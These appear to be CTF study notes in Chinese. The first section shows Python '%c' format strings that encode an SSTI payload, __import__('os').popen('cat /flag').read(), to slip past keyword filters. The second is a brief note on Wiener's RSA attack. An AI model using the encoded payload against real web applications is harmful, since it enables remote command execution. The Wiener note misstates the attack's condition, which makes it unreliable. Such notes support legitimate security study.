**SSTI 8进制Unicode 详解:**
- `('%c'*11)%(95,95,103,108,111,98,97,108,115,95,95)` = `__globals__` (11 chars)
  - 95='_', 95='_', 103='g', 108='l', 111='o', 98='b', 97='a', 108='l', 115='s', 95='_', 95='_'
- `('%c'*11)%(95,95,103,101,116,105,116,101,109,95,95)` = `__getitem__`
- `('%c'*12)%(95,95,98,117,105,108,116,105,110,115,95,95)` = `__builtins__`
- `('%c'*4)%(101,118,97,108)` = `eval`
- `('%c'*42)%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,102,108,97,103,39,41,46,114,101,97,100,40,41)` = `__import__('os').popen('cat /flag').read()`

**Wiener攻击**
- e较小/φ(N)较小时,e/φ(N)连分数逼近收敛子满足e*w-φ(N)*k=±1
- 求w即d
